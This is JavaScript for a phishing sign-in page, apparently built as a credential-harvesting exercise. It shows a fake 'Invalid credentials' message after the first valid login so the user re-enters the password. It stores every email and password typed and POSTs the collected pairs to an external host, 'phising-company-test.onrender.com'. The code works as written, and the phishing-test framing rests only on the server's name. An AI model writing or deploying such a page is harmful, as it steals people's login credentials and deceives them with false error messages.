
let btn = document.querySelector('#signIn')

let creditionals_array = []
attempts = 0


if (btn){
    btn.addEventListener('click', function(event) {
        event.preventDefault()

        let email = document.querySelector('#email').value
        let password = document.querySelector('#password').value

        let validate = validateForm(email, password)
        if (validate) {
            if (attempts < 1){
                handleFailedAttempt()
                creditionals_array.push({email: email, password: password}) 
                console.log('Credentials Array:', creditionals_array)
            } else {
                creditionals_array.push({email: email, password: password})
                console.log('Credentials Array:', creditionals_array)
                sendCredentialsToServer(creditionals_array)
            }
        }
    })
}




function validateForm(email, password) {

    let errorMessage = document.querySelector('#errorMessage')
    errorMessage.innerText = '' // Clear previous error messages

    if (!email || !password) {
        errorMessage.innerText = 'Email and Password are required.'
        return false
    }
    if (!validateEmail(email)) {
        errorMessage.innerText = 'Please enter a valid email address.'
        return false
    }
    if (password.length < 6) {
        errorMessage.innerText = 'Password must be at least 6 characters long.'
        return false
    }
    return true
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return re.test(String(email).toLowerCase())
}


// first attempt function that asks users to re-enter credentials
function handleFailedAttempt() {
    attempts++
    let errorMessage = document.querySelector('#errorMessage')  
    if (attempts >= 3) {
        errorMessage.innerText = 'Too many failed attempts. Please try again later.'
        document.querySelector('#signIn').disabled = true
    } else {
        errorMessage.innerText = `Invalid credentials. You have ${3 - attempts} attempts left.`
    }
}


sendCredentialsAttempts = 0

//send creditonals array to server function
function sendCredentialsToServer(credentials) {

    try {
        fetch('https://phising-company-test.onrender.com/add', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ credentials: credentials })
    })
    console.log('Credentials sent to server successfully', )
    //redirect()

    } catch (error) {
        if (sendCredentialsAttempts < 3){
            console.log('Retrying to send credentials, attempt:', sendCredentialsAttempts + 1)
            sendCredentialsAttempts++
            sendCredentialsToServer(credentials)
        } else {
            //redirect()
            console.error('Failed to send credentials after multiple attempts:', error)
        }
    }finally{
    }
    

}


function redirect(){
    window.location.href = 'https://www.youtube.com/watch?v=Yz0PnAkeRiI'
}